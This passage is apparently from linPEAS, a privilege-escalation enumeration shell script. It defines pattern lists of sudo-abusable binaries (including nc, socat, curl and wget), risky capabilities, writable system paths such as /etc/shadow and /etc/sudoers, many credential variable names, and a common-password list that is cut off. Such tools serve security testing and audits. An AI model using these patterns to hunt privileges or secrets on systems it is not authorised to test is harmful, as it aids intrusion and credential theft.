sudoVB=" \*|env_keep\+=LD_PRELOAD|apt-get$|apt$|aria2c$|arp$|ash$|awk$|base64$|bash$|busybox$|cat$|chmod$|chown$|cp$|cpan$|cpulimit$|crontab$|csh$|curl$|cut$|dash$|date$|dd$|diff$|dmesg$|dmsetup$|dnf$|docker$|dpkg$|easy_install$|ed$|emacs$|env$|expand$|expect$|facter$|file$|find$|flock$|fmt$|fold$|ftp$|gdb$|gimp$|git$|grep$|head$|ionice$|ip$|irb$|jjs$|journalctl$|jq$|jrunscript$|ksh$|ld.so$|less$|logsave$|ltrace$|lua$|mail$|make$|man$|more$|mount$|mtr$|mv$|mysql$|nano$|nc$|nice$|nl$|nmap$|node$|od$|openssl$|perl$|pg$|php$|pic$|pico$|pip$|puppet$|python$|readelf$|red$|rlwrap$|rpm$|rpmquery$|rsync$|ruby$|run-mailcap$|run-parts$|rvim$|scp$|screen$|script$|sed$|service$|setarch$|sftp$|smbclient$|socat$|sort$|sqlite3$|ssh$|start-stop-daemon$|stdbuf$|strace$|systemctl$|tail$|tar$|taskset$|tclsh$|tcpdump$|tee$|telnet$|tftp$|time$|timeout$|tmux$|ul$|unexpand$|uniq$|unshare$|vi$|vim$|watch$|wget$|wish$|xargs$|xxd$|yum$|zip$|zsh$|zypper$"
sudoB="$(whoami)|ALL:ALL|ALL : ALL|ALL|NOPASSWD|SETENV|/apache2|/cryptsetup|/mount"
sudoG="NOEXEC"

sudocapsB="/apt-get|/apt|/aria2c|/arp|/ash|/awk|/base64|/bash|/busybox|/cat|/chmod|/chown|/cp|/cpan|/cpulimit|/crontab|/csh|/curl|/cut|/dash|/date|/dd|/diff|/dmesg|/dmsetup|/dnf|/docker|/dpkg|/easy_install|/ed|/emacs|/env|/expand|/expect|/facter|/file|/find|/flock|/fmt|/fold|/ftp|/gdb|/gimp|/git|/grep|/head|/ionice|/ip|/irb|/jjs|/journalctl|/jq|/jrunscript|/ksh|/ld.so|/less|/logsave|/ltrace|/lua|/mail|/make|/man|/more|/mount|/mtr|/mv|/mysql|/nano|/nc|/nice|/nl|/nmap|/node|/od|/openssl|/perl|/pg|/php|/pic|/pico|/pip|/puppet|/python|/readelf|/red|/rlwrap|/rpm|/rpmquery|/rsync|/ruby|/run-mailcap|/run-parts|/rvim|/scp|/screen|/script|/sed|/service|/setarch|/sftp|/smbclient|/socat|/sort|/sqlite3|/ssh|/start-stop-daemon|/stdbuf|/strace|/systemctl|/tail|/tar|/taskset|/tclsh|/tcpdump|/tee|/telnet|/tftp|/time|/timeout|/tmux|/ul|/unexpand|/uniq|/unshare|/vi|/vim|/watch|/wget|/wish|/xargs|/xxd|/yum|/zip|/zsh|/zypper"
capsB="=ep|cap_chown|cap_dac_override|cap_dac_read_search|cap_setuid|sys_admin|sys_ptrace|sys_module"
containercapsB="sys_admin|sys_ptrace|sys_module|dac_read_search|dac_override"

OLDPATH=$PATH
ADDPATH=":/usr/local/sbin\
 :/usr/local/bin\
 :/usr/sbin\
 :/usr/bin\
 :/sbin\
 :/bin"
spath=":$PATH"
for P in $ADDPATH; do
  if [ ! -z "${spath##*$P*}" ]; then export PATH="$PATH$P" 2>/dev/null; fi
done

# test if sed supports -E or -r
E=E
echo | sed -${E} 's/o/a/' 2>/dev/null
if [ $? -ne 0 ] ; then
	echo | sed -r 's/o/a/' 2>/dev/null
	if [ $? -eq 0 ] ; then
		E=r
	else
		echo "${Y}WARNING: No suitable option found for extended regex with sed. Continuing but the results might be unreliable.${NC}"
	fi
fi

writeB="00-header|10-help-text|50-motd-news|80-esm|91-release-upgrade|\.sh$|\./|/authorized_keys|/bin/|/boot/|/etc/apache2/apache2.conf|/etc/apache2/httpd.conf|/etc/hosts.allow|/etc/hosts.deny|/etc/httpd/conf/httpd.conf|/etc/httpd/httpd.conf|/etc/inetd.conf|/etc/incron.conf|/etc/login.defs|/etc/logrotate.d/|/etc/modprobe.d/|/etc/pam.d/|/etc/php.*/fpm/pool.d/|/etc/php/.*/fpm/pool.d/|/etc/rsyslog.d/|/etc/skel/|/etc/sysconfig/network-scripts/|/etc/sysctl.conf|/etc/sysctl.d/|/etc/uwsgi/apps-enabled/|/etc/xinetd.conf|/etc/xinetd.d/|/etc/|/home//|/lib/|/log/|/mnt/|/root|/sys/|/usr/bin|/usr/games|/usr/lib|/usr/local/bin|/usr/local/games|/usr/local/sbin|/usr/sbin|/sbin/|/var/log/|\.timer$|\.service$|.socket$"
writeVB="/etc/anacrontab|/etc/bash.bashrc|/etc/bash_completion|/etc/bash_completion.d/|/etc/cron|/etc/environment|/etc/environment.d/|/etc/group|/etc/incron.d/|/etc/init|/etc/ld.so.conf.d/|/etc/master.passwd|/etc/passwd|/etc/profile.d/|/etc/profile|/etc/rc.d|/etc/shadow|/etc/skey/|/etc/sudoers|/etc/sudoers.d/|/etc/supervisor/conf.d/|/etc/supervisor/supervisord.conf|/etc/systemd|/etc/sys|/lib/systemd|/etc/update-motd.d/|/root/.ssh/|/run/systemd|/usr/lib/systemd|/systemd/system|/var/db/yubikey/|/var/spool/anacron|/var/spool/cron/crontabs|"`echo $PATH 2>/dev/null | sed 's/:\.:/:/g' | sed 's/:\.$//g' | sed 's/^\.://g' | sed 's/:/$|^/g'` #Add Path but remove simple dot in PATH

if [ "$MACPEAS" ]; then
  sh_usrs="ImPoSSssSiBlEee"
  nosh_usrs="ImPoSSssSiBlEee"
  dscl . list /Users | while read uname; do
    ushell=`dscl . -read "/Users/$uname" UserShell | cut -d " " -f2`
    if [ "`grep \"$ushell\" /etc/shells`" ]; then sh_usrs="$sh_usrs|$uname"; else nosh_usrs="$nosh_usrs|$uname"; fi
  done
else
  sh_usrs=`cat /etc/passwd 2>/dev/null | grep -v "^root:" | grep -i "sh$" | cut -d ":" -f 1 | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/' | sed 's/|sys|/|sys[\\\s:]|^sys$|/' | sed 's/|daemon|/|daemon[\\\s:]|^daemon$|/'`"ImPoSSssSiBlEee" #Modified bin, sys and daemon so they are not colored everywhere
  nosh_usrs=`cat /etc/passwd 2>/dev/null | grep -i -v "sh$" | sort | cut -d ":" -f 1 | tr '\n' '|' | sed 's/|bin|/|bin[\\\s:]|^bin$|/'`"ImPoSSssSiBlEee"
fi
knw_usrs='daemon\W|^daemon$|message\+|syslog|www|www-data|mail|noboby|Debian\-\+|rtkit|systemd\+'
USER=`whoami`
if [ ! "$HOME" ]; then
  if [ -d "/Users/$USER" ]; then HOME="/Users/$USER"; #Mac home
  else HOME="/home/$USER";
  fi
fi
Groups="ImPoSSssSiBlEee"`groups "$USER" 2>/dev/null | cut -d ":" -f 2 | tr ' ' '|'`

#This variables are dived in several different ones because NetBSD required it
pwd_inside_history="7z|unzip|useradd|linenum|linpeas|mkpasswd|htpasswd|openssl|PASSW|passw|shadow|root|sudo|^su|pkexec|^ftp|mongo|psql|mysql|rdesktop|xfreerdp|^ssh|steghide|@"
pwd_in_variables1="Dgpg.passphrase|Dsonar.login|Dsonar.projectKey|GITHUB_TOKEN|HB_CODESIGN_GPG_PASS|HB_CODESIGN_KEY_PASS|PUSHOVER_TOKEN|PUSHOVER_USER|VIRUSTOTAL_APIKEY|ACCESSKEY|ACCESSKEYID|ACCESS_KEY|ACCESS_KEY_ID|ACCESS_KEY_SECRET|ACCESS_SECRET|ACCESS_TOKEN|ACCOUNT_SID|ADMIN_EMAIL|ADZERK_API_KEY|ALGOLIA_ADMIN_KEY_1|ALGOLIA_ADMIN_KEY_2|ALGOLIA_ADMIN_KEY_MCM|ALGOLIA_API_KEY|ALGOLIA_API_KEY_MCM|ALGOLIA_API_KEY_SEARCH|ALGOLIA_APPLICATION_ID|ALGOLIA_APPLICATION_ID_1|ALGOLIA_APPLICATION_ID_2|ALGOLIA_APPLICATION_ID_MCM|ALGOLIA_APP_ID|ALGOLIA_APP_ID_MCM|ALGOLIA_SEARCH_API_KEY|ALGOLIA_SEARCH_KEY|ALGOLIA_SEARCH_KEY_1|ALIAS_NAME|ALIAS_PASS|ALICLOUD_ACCESS_KEY|ALICLOUD_SECRET_KEY|amazon_bucket_name|AMAZON_SECRET_ACCESS_KEY|ANDROID_DOCS_DEPLOY_TOKEN|android_sdk_license|android_sdk_preview_license|aos_key|aos_sec|APIARY_API_KEY|APIGW_ACCESS_TOKEN|API_KEY|API_KEY_MCM|API_KEY_SECRET|API_KEY_SID|API_SECRET|appClientSecret|APP_BUCKET_PERM|APP_NAME|APP_REPORT_TOKEN_KEY|APP_TOKEN|ARGOS_TOKEN|ARTIFACTORY_KEY|ARTIFACTS_AWS_ACCESS_KEY_ID|ARTIFACTS_AWS_SECRET_ACCESS_KEY|ARTIFACTS_BUCKET|ARTIFACTS_KEY|ARTIFACTS_SECRET|ASSISTANT_IAM_APIKEY|AURORA_STRING_URL|AUTH0_API_CLIENTID|AUTH0_API_CLIENTSECRET|AUTH0_AUDIENCE|AUTH0_CALLBACK_URL|AUTH0_CLIENT_ID"
pwd_in_variables2="AUTH0_CLIENT_SECRET|AUTH0_CONNECTION|AUTH0_DOMAIN|AUTHOR_EMAIL_ADDR|AUTHOR_NPM_API_KEY|AUTH_TOKEN|AWS-ACCT-ID|AWS-KEY|AWS-SECRETS|AWS.config.accessKeyId|AWS.config.secretAccessKey|AWSACCESSKEYID|AWSCN_ACCESS_KEY_ID|AWSCN_SECRET_ACCESS_KEY|AWSSECRETKEY|AWS_ACCESS|AWS_ACCESS_KEY|AWS_ACCESS_KEY_ID|AWS_CF_DIST_ID|AWS_DEFAULT|AWS_DEFAULT_REGION|AWS_S3_BUCKET|AWS_SECRET|AWS_SECRET_ACCESS_KEY|AWS_SECRET_KEY|AWS_SES_ACCESS_KEY_ID|AWS_SES_SECRET_ACCESS_KEY|B2_ACCT_ID|B2_APP_KEY|B2_BUCKET|baseUrlTravis|bintrayKey|bintrayUser|BINTRAY_APIKEY|BINTRAY_API_KEY|BINTRAY_KEY|BINTRAY_TOKEN|BINTRAY_USER|BLUEMIX_ACCOUNT|BLUEMIX_API_KEY|BLUEMIX_AUTH|BLUEMIX_NAMESPACE|BLUEMIX_ORG|BLUEMIX_ORGANIZATION|BLUEMIX_PASS|BLUEMIX_PASS_PROD|BLUEMIX_SPACE|BLUEMIX_USER|BRACKETS_REPO_OAUTH_TOKEN|BROWSERSTACK_ACCESS_KEY|BROWSERSTACK_PROJECT_NAME|BROWSER_STACK_ACCESS_KEY|BUCKETEER_AWS_ACCESS_KEY_ID|BUCKETEER_AWS_SECRET_ACCESS_KEY|BUCKETEER_BUCKET_NAME|BUILT_BRANCH_DEPLOY_KEY|BUNDLESIZE_GITHUB_TOKEN|CACHE_S3_SECRET_KEY|CACHE_URL|CARGO_TOKEN|CATTLE_ACCESS_KEY|CATTLE_AGENT_INSTANCE_AUTH|CATTLE_SECRET_KEY|CC_TEST_REPORTER_ID|CC_TEST_REPOTER_ID|CENSYS_SECRET|CENSYS_UID|CERTIFICATE_OSX_P12|CF_ORGANIZATION|CF_PROXY_HOST|channelId|CHEVERNY_TOKEN|CHROME_CLIENT_ID"
pwd_in_variables3="CHROME_CLIENT_SECRET|CHROME_EXTENSION_ID|CHROME_REFRESH_TOKEN|CI_DEPLOY_USER|CI_NAME|CI_PROJECT_NAMESPACE|CI_PROJECT_URL|CI_REGISTRY_USER|CI_SERVER_NAME|CI_USER_TOKEN|CLAIMR_DATABASE|CLAIMR_DB|CLAIMR_SUPERUSER|CLAIMR_TOKEN|CLIENT_ID|CLIENT_SECRET|CLI_E2E_CMA_TOKEN|CLI_E2E_ORG_ID|CLOUDAMQP_URL|CLOUDANT_APPLIANCE_DATABASE|CLOUDANT_ARCHIVED_DATABASE|CLOUDANT_AUDITED_DATABASE|CLOUDANT_DATABASE|CLOUDANT_ORDER_DATABASE|CLOUDANT_PARSED_DATABASE|CLOUDANT_PROCESSED_DATABASE|CLOUDANT_SERVICE_DATABASE|CLOUDFLARE_API_KEY|CLOUDFLARE_AUTH_EMAIL|CLOUDFLARE_AUTH_KEY|CLOUDFLARE_EMAIL|CLOUDFLARE_ZONE_ID|CLOUDINARY_URL|CLOUDINARY_URL_EU|CLOUDINARY_URL_STAGING|CLOUD_API_KEY|CLUSTER_NAME|CLU_REPO_URL|CLU_SSH_PRIVATE_KEY_BASE64|CN_ACCESS_KEY_ID|CN_SECRET_ACCESS_KEY|COCOAPODS_TRUNK_EMAIL|COCOAPODS_TRUNK_TOKEN|CODACY_PROJECT_TOKEN|CODECLIMATE_REPO_TOKEN|CODECOV_TOKEN|coding_token|CONEKTA_APIKEY|CONFIGURATION_PROFILE_SID|CONFIGURATION_PROFILE_SID_P2P|CONFIGURATION_PROFILE_SID_SFU|CONSUMERKEY|CONSUMER_KEY|CONTENTFUL_ACCESS_TOKEN|CONTENTFUL_CMA_TEST_TOKEN|CONTENTFUL_INTEGRATION_MANAGEMENT_TOKEN|CONTENTFUL_INTEGRATION_SOURCE_SPACE|CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN|CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN_NEW|CONTENTFUL_ORGANIZATION"
pwd_in_variables4="CONTENTFUL_PHP_MANAGEMENT_TEST_TOKEN|CONTENTFUL_TEST_ORG_CMA_TOKEN|CONTENTFUL_V2_ACCESS_TOKEN|CONTENTFUL_V2_ORGANIZATION|CONVERSATION_URL|COREAPI_HOST|COS_SECRETS|COVERALLS_API_TOKEN|COVERALLS_REPO_TOKEN|COVERALLS_SERVICE_NAME|COVERALLS_TOKEN|COVERITY_SCAN_NOTIFICATION_EMAIL|COVERITY_SCAN_TOKEN|CYPRESS_RECORD_KEY|DANGER_GITHUB_API_TOKEN|DATABASE_HOST|DATABASE_NAME|DATABASE_PORT|DATABASE_USER|datadog_api_key|datadog_app_key|DB_CONNECTION|DB_DATABASE|DB_HOST|DB_PORT|DB_PW|DB_USER|DDGC_GITHUB_TOKEN|DDG_TEST_EMAIL|DDG_TEST_EMAIL_PW|DEPLOY_DIR|DEPLOY_DIRECTORY|DEPLOY_HOST|DEPLOY_PORT|DEPLOY_SECURE|DEPLOY_TOKEN|DEPLOY_USER|DEST_TOPIC|DHL_SOLDTOACCOUNTID|DH_END_POINT_1|DH_END_POINT_2|DIGITALOCEAN_ACCESS_TOKEN|DIGITALOCEAN_SSH_KEY_BODY|DIGITALOCEAN_SSH_KEY_IDS|DOCKER_EMAIL|DOCKER_KEY|DOCKER_PASSDOCKER_POSTGRES_URL|DOCKER_RABBITMQ_HOST|docker_repo|DOCKER_TOKEN|DOCKER_USER|DOORDASH_AUTH_TOKEN|DROPBOX_OAUTH_BEARER|ELASTICSEARCH_HOST|ELASTIC_CLOUD_AUTH|env.GITHUB_OAUTH_TOKEN|env.HEROKU_API_KEY|ENV_KEY|ENV_SECRET|ENV_SECRET_ACCESS_KEY|eureka.awsAccessId"
pwd_in_variables5="eureka.awsSecretKey|ExcludeRestorePackageImports|EXPORT_SPACE_ID|FIREBASE_API_JSON|FIREBASE_API_TOKEN|FIREBASE_KEY|FIREBASE_PROJECT|FIREBASE_PROJECT_DEVELOP|FIREBASE_PROJECT_ID|FIREBASE_SERVICE_ACCOUNT|FIREBASE_TOKEN|FIREFOX_CLIENT|FIREFOX_ISSUER|FIREFOX_SECRET|FLASK_SECRET_KEY|FLICKR_API_KEY|FLICKR_API_SECRET|FOSSA_API_KEY|ftp_host|FTP_LOGIN|FTP_PW|FTP_USER|GCLOUD_BUCKET|GCLOUD_PROJECT|GCLOUD_SERVICE_KEY|GCS_BUCKET|GHB_TOKEN|GHOST_API_KEY|GH_API_KEY|GH_EMAIL|GH_NAME|GH_NEXT_OAUTH_CLIENT_ID|GH_NEXT_OAUTH_CLIENT_SECRET|GH_NEXT_UNSTABLE_OAUTH_CLIENT_ID|GH_NEXT_UNSTABLE_OAUTH_CLIENT_SECRET|GH_OAUTH_CLIENT_ID|GH_OAUTH_CLIENT_SECRET|GH_OAUTH_TOKEN|GH_REPO_TOKEN|GH_TOKEN|GH_UNSTABLE_OAUTH_CLIENT_ID|GH_UNSTABLE_OAUTH_CLIENT_SECRET|GH_USER_EMAIL|GH_USER_NAME|GITHUB_ACCESS_TOKEN|GITHUB_API_KEY|GITHUB_API_TOKEN|GITHUB_AUTH|GITHUB_AUTH_TOKEN|GITHUB_AUTH_USER|GITHUB_CLIENT_ID|GITHUB_CLIENT_SECRET|GITHUB_DEPLOYMENT_TOKEN|GITHUB_DEPLOY_HB_DOC_PASS|GITHUB_HUNTER_TOKEN|GITHUB_KEY|GITHUB_OAUTH|GITHUB_OAUTH_TOKEN|GITHUB_RELEASE_TOKEN|GITHUB_REPO|GITHUB_TOKEN|GITHUB_TOKENS|GITHUB_USER|GITLAB_USER_EMAIL|GITLAB_USER_LOGIN|GIT_AUTHOR_EMAIL|GIT_AUTHOR_NAME|GIT_COMMITTER_EMAIL|GIT_COMMITTER_NAME|GIT_EMAIL|GIT_NAME|GIT_TOKEN|GIT_USER"
pwd_in_variables6="GOOGLE_CLIENT_EMAIL|GOOGLE_CLIENT_ID|GOOGLE_CLIENT_SECRET|GOOGLE_MAPS_API_KEY|GOOGLE_PRIVATE_KEY|gpg.passphrase|GPG_EMAIL|GPG_ENCRYPTION|GPG_EXECUTABLE|GPG_KEYNAME|GPG_KEY_NAME|GPG_NAME|GPG_OWNERTRUST|GPG_PASSPHRASE|GPG_PRIVATE_KEY|GPG_SECRET_KEYS|gradle.publish.key|gradle.publish.secret|GRADLE_SIGNING_KEY_ID|GREN_GITHUB_TOKEN|GRGIT_USER|HAB_AUTH_TOKEN|HAB_KEY|HB_CODESIGN_GPG_PASS|HB_CODESIGN_KEY_PASS|HEROKU_API_KEY|HEROKU_API_USER|HEROKU_EMAIL|HEROKU_TOKEN|HOCKEYAPP_TOKEN|INTEGRATION_TEST_API_KEY|INTEGRATION_TEST_APPID|INTERNAL-SECRETS|IOS_DOCS_DEPLOY_TOKEN|IRC_NOTIFICATION_CHANNEL|JDBC:MYSQL|jdbc_databaseurl|jdbc_host|jdbc_user|JWT_SECRET|KAFKA_ADMIN_URL|KAFKA_INSTANCE_NAME|KAFKA_REST_URL|KEYSTORE_PASS|KOVAN_PRIVATE_KEY|LEANPLUM_APP_ID|LEANPLUM_KEY|LICENSES_HASH|LICENSES_HASH_TWO|LIGHTHOUSE_API_KEY|LINKEDIN_CLIENT_ID|LINKEDIN_CLIENT_SECRET|LINODE_INSTANCE_ID|LINODE_VOLUME_ID|LINUX_SIGNING_KEY|LL_API_SHORTNAME|LL_PUBLISH_URL|LL_SHARED_KEY|LOOKER_TEST_RUNNER_CLIENT_ID|LOOKER_TEST_RUNNER_CLIENT_SECRET|LOOKER_TEST_RUNNER_ENDPOINT|LOTTIE_HAPPO_API_KEY|LOTTIE_HAPPO_SECRET_KEY|LOTTIE_S3_API_KEY|LOTTIE_S3_SECRET_KEY|mailchimp_api_key|MAILCHIMP_KEY|mailchimp_list_id|mailchimp_user|MAILER_HOST|MAILER_TRANSPORT|MAILER_USER"
pwd_in_variables7="MAILGUN_APIKEY|MAILGUN_API_KEY|MAILGUN_DOMAIN|MAILGUN_PRIV_KEY|MAILGUN_PUB_APIKEY|MAILGUN_PUB_KEY|MAILGUN_SECRET_API_KEY|MAILGUN_TESTDOMAIN|ManagementAPIAccessToken|MANAGEMENT_TOKEN|MANAGE_KEY|MANAGE_SECRET|MANDRILL_API_KEY|MANIFEST_APP_TOKEN|MANIFEST_APP_URL|MapboxAccessToken|MAPBOX_ACCESS_TOKEN|MAPBOX_API_TOKEN|MAPBOX_AWS_ACCESS_KEY_ID|MAPBOX_AWS_SECRET_ACCESS_KEY|MG_API_KEY|MG_DOMAIN|MG_EMAIL_ADDR|MG_EMAIL_TO|MG_PUBLIC_API_KEY|MG_SPEND_MONEY|MG_URL|MH_APIKEY|MILE_ZERO_KEY|MINIO_ACCESS_KEY|MINIO_SECRET_KEY|MYSQLMASTERUSER|MYSQLSECRET|MYSQL_DATABASE|MYSQL_HOSTNAMEMYSQL_USER|MY_SECRET_ENV|NETLIFY_API_KEY|NETLIFY_SITE_ID|NEW_RELIC_BETA_TOKEN|NGROK_AUTH_TOKEN|NGROK_TOKEN|node_pre_gyp_accessKeyId|NODE_PRE_GYP_GITHUB_TOKEN|node_pre_gyp_secretAccessKey|NPM_API_KEY|NPM_API_TOKEN|NPM_AUTH_TOKEN|NPM_EMAIL|NPM_SECRET_KEY|NPM_TOKEN|NUGET_APIKEY|NUGET_API_KEY|NUGET_KEY|NUMBERS_SERVICE|NUMBERS_SERVICE_PASS|NUMBERS_SERVICE_USER|OAUTH_TOKEN|OBJECT_STORAGE_PROJECT_ID|OBJECT_STORAGE_USER_ID|OBJECT_STORE_BUCKET|OBJECT_STORE_CREDS|OCTEST_SERVER_BASE_URL|OCTEST_SERVER_BASE_URL_2|OC_PASS|OFTA_KEY|OFTA_SECRET|OKTA_CLIENT_TOKEN|OKTA_DOMAIN|OKTA_OAUTH2_CLIENTID|OKTA_OAUTH2_CLIENTSECRET|OKTA_OAUTH2_CLIENT_ID|OKTA_OAUTH2_CLIENT_SECRET"
pwd_in_variables8="OKTA_OAUTH2_ISSUER|OMISE_KEY|OMISE_PKEY|OMISE_PUBKEY|OMISE_SKEY|ONESIGNAL_API_KEY|ONESIGNAL_USER_AUTH_KEY|OPENWHISK_KEY|OPEN_WHISK_KEY|OSSRH_PASS|OSSRH_SECRET|OSSRH_USER|OS_AUTH_URL|OS_PROJECT_NAME|OS_TENANT_ID|OS_TENANT_NAME|PAGERDUTY_APIKEY|PAGERDUTY_ESCALATION_POLICY_ID|PAGERDUTY_FROM_USER|PAGERDUTY_PRIORITY_ID|PAGERDUTY_SERVICE_ID|PANTHEON_SITE|PARSE_APP_ID|PARSE_JS_KEY|PAYPAL_CLIENT_ID|PAYPAL_CLIENT_SECRET|PERCY_TOKEN|PERSONAL_KEY|PERSONAL_SECRET|PG_DATABASE|PG_HOST|PLACES_APIKEY|PLACES_API_KEY|PLACES_APPID|PLACES_APPLICATION_ID|PLOTLY_APIKEY|POSTGRESQL_DB|POSTGRESQL_PASS|POSTGRES_ENV_POSTGRES_DB|POSTGRES_ENV_POSTGRES_USER|POSTGRES_PORT|PREBUILD_AUTH|PROD.ACCESS.KEY.ID|PROD.SECRET.KEY|PROD_BASE_URL_RUNSCOPE|PROJECT_CONFIG|PUBLISH_KEY|PUBLISH_SECRET|PUSHOVER_TOKEN|PUSHOVER_USER|PYPI_PASSOWRD|QUIP_TOKEN|RABBITMQ_SERVER_ADDR|REDISCLOUD_URL|REDIS_STUNNEL_URLS|REFRESH_TOKEN|RELEASE_GH_TOKEN|RELEASE_TOKEN|remoteUserToShareTravis|REPORTING_WEBDAV_URL|REPORTING_WEBDAV_USER|repoToken|REST_API_KEY|RINKEBY_PRIVATE_KEY|ROPSTEN_PRIVATE_KEY|route53_access_key_id|RTD_KEY_PASS|RTD_STORE_PASS|RUBYGEMS_AUTH_TOKEN|s3_access_key|S3_ACCESS_KEY_ID|S3_BUCKET_NAME_APP_LOGS|S3_BUCKET_NAME_ASSETS|S3_KEY"
pwd_in_variables9="S3_KEY_APP_LOGS|S3_KEY_ASSETS|S3_PHOTO_BUCKET|S3_SECRET_APP_LOGS|S3_SECRET_ASSETS|S3_SECRET_KEY|S3_USER_ID|S3_USER_SECRET|SACLOUD_ACCESS_TOKEN|SACLOUD_ACCESS_TOKEN_SECRET|SACLOUD_API|SALESFORCE_BULK_TEST_SECURITY_TOKEN|SANDBOX_ACCESS_TOKEN|SANDBOX_AWS_ACCESS_KEY_ID|SANDBOX_AWS_SECRET_ACCESS_KEY|SANDBOX_LOCATION_ID|SAUCE_ACCESS_KEY|SECRETACCESSKEY|SECRETKEY|SECRET_0|SECRET_10|SECRET_11|SECRET_1|SECRET_2|SECRET_3|SECRET_4|SECRET_5|SECRET_6|SECRET_7|SECRET_8|SECRET_9|SECRET_KEY_BASE|SEGMENT_API_KEY|SELION_SELENIUM_SAUCELAB_GRID_CONFIG_FILE|SELION_SELENIUM_USE_SAUCELAB_GRID|SENDGRID|SENDGRID_API_KEY|SENDGRID_FROM_ADDRESS|SENDGRID_KEY|SENDGRID_USER|SENDWITHUS_KEY|SENTRY_AUTH_TOKEN|SERVICE_ACCOUNT_SECRET|SES_ACCESS_KEY|SES_SECRET_KEY|setDstAccessKey|setDstSecretKey|setSecretKey|SIGNING_KEY|SIGNING_KEY_SECRET|SIGNING_KEY_SID|SNOOWRAP_CLIENT_SECRET|SNOOWRAP_REDIRECT_URI|SNOOWRAP_REFRESH_TOKEN|SNOOWRAP_USER_AGENT|SNYK_API_TOKEN|SNYK_ORG_ID|SNYK_TOKEN|SOCRATA_APP_TOKEN|SOCRATA_USER|SONAR_ORGANIZATION_KEY|SONAR_PROJECT_KEY|SONAR_TOKEN|SONATYPE_GPG_KEY_NAME|SONATYPE_GPG_PASSPHRASE|SONATYPE_PASSSONATYPE_TOKEN_USER|SONATYPE_USER|SOUNDCLOUD_CLIENT_ID|SOUNDCLOUD_CLIENT_SECRET|SPACES_ACCESS_KEY_ID|SPACES_SECRET_ACCESS_KEY"
pwd_in_variables10="SPA_CLIENT_ID|SPOTIFY_API_ACCESS_TOKEN|SPOTIFY_API_CLIENT_ID|SPOTIFY_API_CLIENT_SECRET|sqsAccessKey|sqsSecretKey|SRCCLR_API_TOKEN|SSHPASS|SSMTP_CONFIG|STARSHIP_ACCOUNT_SID|STARSHIP_AUTH_TOKEN|STAR_TEST_AWS_ACCESS_KEY_ID|STAR_TEST_BUCKET|STAR_TEST_LOCATION|STAR_TEST_SECRET_ACCESS_KEY|STORMPATH_API_KEY_ID|STORMPATH_API_KEY_SECRET|STRIPE_PRIVATE|STRIPE_PUBLIC|STRIP_PUBLISHABLE_KEY|STRIP_SECRET_KEY|SURGE_LOGIN|SURGE_TOKEN|SVN_PASS|SVN_USER|TESCO_API_KEY|THERA_OSS_ACCESS_ID|THERA_OSS_ACCESS_KEY|TRAVIS_ACCESS_TOKEN|TRAVIS_API_TOKEN|TRAVIS_COM_TOKEN|TRAVIS_E2E_TOKEN|TRAVIS_GH_TOKEN|TRAVIS_PULL_REQUEST|TRAVIS_SECURE_ENV_VARS|TRAVIS_TOKEN|TREX_CLIENT_ORGURL|TREX_CLIENT_TOKEN|TREX_OKTA_CLIENT_ORGURL|TREX_OKTA_CLIENT_TOKEN|TWILIO_ACCOUNT_ID|TWILIO_ACCOUNT_SID|TWILIO_API_KEY|TWILIO_API_SECRET|TWILIO_CHAT_ACCOUNT_API_SERVICE|TWILIO_CONFIGURATION_SID|TWILIO_SID|TWILIO_TOKEN|TWITTEROAUTHACCESSSECRET|TWITTEROAUTHACCESSTOKEN|TWITTER_CONSUMER_KEY|TWITTER_CONSUMER_SECRET|UNITY_SERIAL|URBAN_KEY|URBAN_MASTER_SECRET|URBAN_SECRET|userTravis|USER_ASSETS_ACCESS_KEY_ID|USER_ASSETS_SECRET_ACCESS_KEY|VAULT_APPROLE_SECRET_ID|VAULT_PATH|VIP_GITHUB_BUILD_REPO_DEPLOY_KEY|VIP_GITHUB_DEPLOY_KEY|VIP_GITHUB_DEPLOY_KEY_PASS"
pwd_in_variables11="VIRUSTOTAL_APIKEY|VISUAL_RECOGNITION_API_KEY|V_SFDC_CLIENT_ID|V_SFDC_CLIENT_SECRET|WAKATIME_API_KEY|WAKATIME_PROJECT|WATSON_CLIENT|WATSON_CONVERSATION_WORKSPACE|WATSON_DEVICE|WATSON_DEVICE_TOPIC|WATSON_TEAM_ID|WATSON_TOPIC|WIDGET_BASIC_USER_2|WIDGET_BASIC_USER_3|WIDGET_BASIC_USER_4|WIDGET_BASIC_USER_5|WIDGET_FB_USER|WIDGET_FB_USER_2|WIDGET_FB_USER_3|WIDGET_TEST_SERVERWORDPRESS_DB_USER|WORKSPACE_ID|WPJM_PHPUNIT_GOOGLE_GEOCODE_API_KEY|WPT_DB_HOST|WPT_DB_NAME|WPT_DB_USER|WPT_PREPARE_DIR|WPT_REPORT_API_KEY|WPT_SSH_CONNECT|WPT_SSH_PRIVATE_KEY_BASE64|YANGSHUN_GH_TOKEN|YT_ACCOUNT_CHANNEL_ID|YT_ACCOUNT_CLIENT_ID|YT_ACCOUNT_CLIENT_SECRET|YT_ACCOUNT_REFRESH_TOKEN|YT_API_KEY|YT_CLIENT_ID|YT_CLIENT_SECRET|YT_PARTNER_CHANNEL_ID|YT_PARTNER_CLIENT_ID|YT_PARTNER_CLIENT_SECRET|YT_PARTNER_ID|YT_PARTNER_REFRESH_TOKEN|YT_SERVER_API_KEY|ZHULIANG_GH_TOKEN|ZOPIM_ACCOUNT_KEY"

top2000pwds="123456 password 123456789 12345678 12345 qwerty 123123 111111 abc123 1234567 dragon 1q2w3e4r sunshine 654321 master 1234 football 1234567890 000000 computer 666666 superman michael internet iloveyou daniel 1qaz2wsx monkey shadow jessica letmein baseball whatever princess abcd1234 123321 starwars 121212 thomas zxcvbnm trustno1 killer welcome jordan aaaaaa 123qwe freedom password1 charlie batman jennifer 7777777 michelle diamond oliver mercedes benjamin 11111111 snoopy samantha victoria matrix george alexander secret cookie asdfgh 987654321 123abc orange fuckyou asdf1234 pepper hunter silver joshua banana 1q2w3e chelsea 1234qwer summer qwertyuiop phoenix andrew q1w2e3r4 elephant rainbow mustang merlin london garfield robert chocolate 112233 samsung qazwsx matthew buster jonathan ginger flower 555555 test caroline amanda maverick midnight martin junior 88888888 anthony jasmine creative patrick mickey 123 qwerty123 cocacola chicken passw0rd forever william nicole hello yellow nirvana justin friends cheese tigger mother liverpool blink182 asdfghjkl andrea spider scooter richard soccer rachel purple morgan melissa jackson arsenal 222222 qwe123 gabriel ferrari jasper danielle bandit angela scorpion prince maggie austin veronica nicholas monster dexter carlos 